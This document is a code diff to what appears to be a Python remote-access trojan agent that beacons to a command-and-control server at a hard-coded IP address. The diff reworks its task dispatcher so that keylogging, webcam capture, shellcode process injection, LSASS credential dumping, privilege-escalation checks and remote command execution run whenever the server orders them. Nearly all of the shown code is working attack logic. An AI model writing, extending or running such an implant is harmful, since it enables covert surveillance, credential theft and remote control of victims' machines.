@@ -11,7 +11,6 @@ from datetime import datetime
 from modules.system_info import get_system_info
 from modules.common import encrypt_data, decrypt_data
 
-# Windows-only modules
 IS_WINDOWS = platform.system().lower() == "windows"
 if IS_WINDOWS:
     from modules.evasion import Evasion
@@ -22,11 +21,9 @@ if IS_WINDOWS:
     from modules.priv_esc import PrivilegeEscalation
     from modules.post_exploit import PostExploit
 
-# ====== Configuration ======
 C2_URL = "http://192.168.220.141:5001"
 BEACON_INTERVAL = 10
 agent_id = f"agent_{uuid.uuid4()}"
-# ===========================
 
 if IS_WINDOWS:
     evasion = Evasion()
@@ -106,22 +103,22 @@ def run_task(task):
 
     try:
         result = None
-        if IS_WINDOWS:
-            if task_type == "keylogger":
-                result = keylogger.start()
-            elif task_type == "webcam":
-                result = webcam.capture()
-            elif task_type == "process_injection":
-                result = injector.inject(data.get("process"), data.get("shellcode"))
-            elif task_type == "credential_dump":
-                result = cred_dump.dump_lsass()
-            elif task_type == "privilege_escalation":
-                result = priv_esc.check_windows_services()
-            elif task_type == "post_exploit":
-                result = post_exp.execute(data.get("command"))
-
-        if task_type == "system_info":
+        if task_type == "keylogger":
+            result = keylogger.start()
+        elif task_type == "webcam":
+            result = webcam.capture()
+        elif task_type == "process_injection":
+            result = injector.inject(data.get("process"), data.get("shellcode"))
+        elif task_type == "credential_dump":
+            result = cred_dump.dump_lsass()
+        elif task_type == "privilege_escalation":
+            result = priv_esc.check_windows_services()
+        elif task_type == "post_exploit":
+            result = post_exp.execute(data.get("command"))
+        elif task_type == "system_info":
             result = get_system_info()
+        else:
+            result = f"Unknown task: {task_type}"
 
         if result:
             send_result(task_id, result)
